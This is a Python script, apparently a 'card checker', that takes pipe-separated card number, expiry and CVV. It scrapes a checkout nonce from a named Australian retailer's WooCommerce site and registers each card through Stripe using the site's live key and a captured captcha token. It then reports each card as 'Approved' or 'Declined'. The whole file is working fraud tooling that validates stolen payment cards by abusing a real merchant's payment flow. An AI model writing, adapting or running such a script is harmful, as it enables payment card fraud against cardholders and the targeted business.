import requests
import re
from bs4 import BeautifulSoup
import requests
from urllib.parse import urlencode
import json

"""def main(cc):
    return {"status":"Declined ❌","response":"Your card is declined"}
"""
def extract_nonce(response_text, url):
    soup = BeautifulSoup(response_text, 'html.parser')
    checkout_nonce = soup.find('input', {'name': 'woocommerce-process-checkout-nonce'})
    
    if checkout_nonce:
        return checkout_nonce['value']
    stripe_nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response_text)
    
    if stripe_nonce_match:
        return stripe_nonce_match.group(1)
    script_nonce_match = re.search(r'"nonce":"([^"]+)"', response_text)
    
    if script_nonce_match:
        return script_nonce_match.group(1)
    
    raise ValueError(f"Could not find any nonce on {url}")

def main(cc):
    cc, m, y, cvv = cc.split("|")
    y = y.replace("20", "") if y.startswith("20") else y
    headers = {
        'authority': 'buildersdiscountwarehouse.com.au',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'referer': 'https://buildersdiscountwarehouse.com.au/my-account/payment-methods/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; RMX3710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }
    
    response = requests.get(
        'https://buildersdiscountwarehouse.com.au/my-account/add-payment-method/',
        headers=headers,
    )
    try:
        nonce = extract_nonce(response.text,"jij")
        print(nonce)
    except:
        return {"status":"Declined ❌","response":"Failed to get nonce"}
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; RMX3710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    }
    
    data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={y}&card[exp_month]={m}&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2F399197339e%3B+stripe-js-v3%2F399197339e%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbuildersdiscountwarehouse.com.au&time_on_page=49057&client_attribution_metadata[client_session_id]=93922220-e1e0-483b-97f5-21a46f63906b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=b90d2f6d-72ef-4655-9f6b-2b9fc127ced9&guid=40c42e90-9734-4fdb-9403-a58bb3f450877497e6&muid=9f107d21-e6b8-4510-a515-b0c599131f515cb4e2&sid=ab3050e1-7525-4e18-8d48-757ac68bc1e5d054f1&key=pk_live_51Q107x2KzKeWTXXpOywsGdTNQaEtZRRE9LKseUzC1oS3jOdQnP41co3ZYTIckSdqdv2DWOt8nnX469QiDEGacfzl00qHBbMx73&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzU1MzczMjI4LCJjZGF0YSI6IkNhVzd3T2R4b3JHWUZaZzNxLy9NOHhRdkxxVmJBaFpldnZ5VTY0NW4yM0M0VGZ0MGtNZ3N1NzRSNUVKTTVXZHNFQXpVMU9tRlA5VUNKcm1GYStldGtqemhPTDhaVXZSby9IWDVpVWtMeGM3OG9KakhoM1pWald3T095SGJhQW9takJpeVZ0c2RlSGM4ZS96cmdKcWhINzM1ai93T2JmY0xBdnRaVHVoMUtvREdmbUlTRVZXcm1EWUFadXY5UVl0YzF3a3l2TkVXSDhYaDVrZkUiLCJwYXNza2V5IjoibkV6Y2Qrb3FVRG9rUWlhRXkwMUV6MW5NWC9mRHlWNWNoTVg2cVk4Qjg3TThFOGlGdTJYbUtEZXozQUl6L3ZYZUxXZjV1NmFZc3c2VVdpZ3hGcUZmU3l4MzN5YXlpYXgwV0xoY3pvak1NTG5zTCtiTjM2ODVSNzBTK0Y0a0tmOUltNzdEMUJUSS90NWY2VFlDTUlDb1V3OTUyWnozN2UrK0N3TnNlanY5ZHh5d0EyWUpTTGpqSllzZ2duL1FsRXBId1FWeXhxcm0reHByTFI4d3U3ZW45RGM4d1EzekUvZnJoU2hMT0pPUnZLbXFoOWZZUHRDa0dBSmQxa1pBQUg3MmpSdEpTa2NQMUVDSmNsbFowaWtkWVNoRnhRREI4bFQ3OWw0anJLMWcxdjAwR1JkaStYWlNzTVFVYmtzRGF4ekt1cmExc3phQnVCU29uQlFrSlJoeWVJZGdwdFo5blc5UG45aFd4RTRKOWpPOG1RbTlPTXgranNnd1czQUJZbmh1WDFjOFA4S0VLMTNScE5uODQ5RVdic0Q0QUd1VUdBNWh1ekpLV3lVY3h4MGVUaXM5cUtaTXczaDB6R2FmM2wxYVhTSjRVZW9kbjNqdHM5Tjh2SkdmR0F2bytDMExER3pEOHBtaHZsTzVBRjRHc2xGWmZpL0R0WUxNT3lnSnJFOUkyeGc1SEthSWdJeVJDMW94VU1FeUl6bmVGT0szVE11QzhadTBpcVQ4Zm1lNVJWTEVHREd4amVnV1hudExULzFyYmF5eVpPVEFjOWdKTnIyNzNyVlRjeHp6RkpoUHFuSTAvTTFLRjFnSkZORjlpZnBocDF4WTAvTXpCc0RmQ0g4VDJWczdJZkZudWR3RktjSnRGRlY3ZzlJRU1UcG94OEdySlRnOXFJUWFQWG15TEdFSnB0dkZndzJJNG9rb29USUlJa2NKeStMZFJENzJXamdrNEhsVUdRWHF2OVUzZGRZTEtUR21FZGlhVkJoWWNUSWdnei8xSlFHbFZRTGl4MFhEWUpLSG1QVFBlb0VuUWF4SEZnS29KM2RxT2xaUUt1U1ZBTlkvTXBFVzVDcVBrQ3U4QW1zL1RMbDFXSzB3MFJ0S3YyR2d2UktLYXBlUmp0akFyaGVlbjNRaGJaU3R2cEJDMGF4RHptaUl5WjlpNHB6MmZScXJLMUQ1dHNlZmZLTGZMWHNGV0ZSNFVnWUVYMCtuMi9SK0ZmeVdQdDZXNDViOVFHalFVWWFNbnZveVdyenVkYVR0RW5IcWdsbFVvaml5bFVWMURxN2hxL244WjhvVUF0b0pNSlVVNDNwVkhjV25FNlQ3MmlHc2EzWkZUSUVFMXk0aFgxY0Nya1FBZGxUZ2ppK2JpT1dmOUFEU1JLQ2pIWWRuZjNIV1RKQnEzcUZTdkxoR05qSjZQelUwSC91NmJFckJjYTRoL3BpV2xEZis5VU1XWTBFZE1qU1RkUk9HZG5UZWRYRHg5MmdReHFMRjF0MzVaVE13QlQrR0YwWmR0TnU2YnduemxIaURmaS8welBzdUtoVEVPb2NsRlNlamxSS0FTRkMzQjEzeURrcGxWcXA0UGxjcGppYXlIWDFHcGNCMjBidUNoZEp6alRTRnczaVVKZ01lSndmeGZQUVRFTG9QQ2d3SjlVcWI3VWlzZFgydzRKbThBZjBTVlozcGl5RU5pdU5laXNPSFp0NnJ4dkdEVThTQnlKcVJ2RW5jMjRZb3dJbTIrY29tWjUzbjc1c3dLY1FoVFFXbDZ2bDhkZDB2WFlwN2w5OFRIdVFTbWdrM2pQRjVzSFJleVJrQUdhcmo5NzlycVdsaEZtVGkvVGJ2bUNWYjNtVU9GZTcrRTlUblhPSVRxeUk5UWo0cjJoZHlsenh3cCttR1dNQU9qeVAvd20rMXhMUWxCQUVzdGQyalZsZThtbHY3ajA3RXE1OWVkUGNpYVNnWldOWjhKclUyTFZJV05pVTd6czhyQkpwOTFmdFFNdEg3c0lySHhkSXpjQVI4QlNBMVllelA0VWthSmxQVGF4dUlWMU5Oc1pGWE45UmlBTkZ4L3BtdWhFdTJDakZMZlZldUtHWDhMazJkRXM1S2tPOXVja3FiR054aXNDTnpHYnluVmt5YVlqUjFqWG5uMTh4eU8yREZLYXEyZmxoK1BMWWZUbE1lMEZCWkYrd3ZxOXBZaGhoQmZsVmZFcXBQZXFVUHlWZVp5TW5abzhOZEZLUnA1UmtCaldHZ0hvV3MyQ3hOc3d3ZXVZc3JrM092b3ZpeCIsImtyIjoiM2Y2ZTM4ZDkiLCJzaGFyZF9pZCI6MjU5MTg5MzU5fQ.qShofF8oyQnYv2j1XXcmy_BK8t5f99MaTL-jfmnFdqE'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
        idd = response.json()["id"]
    except:
        return {"status":"Declined ❌","response":"Failed to get id"} 
    
    
    
    
    
    headers = {
        'authority': 'buildersdiscountwarehouse.com.au',
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://buildersdiscountwarehouse.com.au',
        'referer': 'https://buildersdiscountwarehouse.com.au/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; RMX3710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    params = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
    }
    
    data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': idd,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }
    
    response = requests.post('https://buildersdiscountwarehouse.com.au/', params=params, headers=headers, data=data)
    
    try:
        data= response.json()
        
        #return data
        #data = response.json()
        
        if "error" in data.get("data", {}):
            result = data["data"]["error"].get("message", "Unknown error")
            status = "Declined ❌"
        
        elif "status" in data.get("data", {}):
            result = data["data"]["status"]
            status = "Approved ✅"
        
        else:
            # fallback to raw response if nothing matched
            result = data
            status = "Raw Response 📦"
        
        return {"status": status, "response": result}
        
        
        print(response.text)
    except Exception as e:
        print(e)
        
        
        
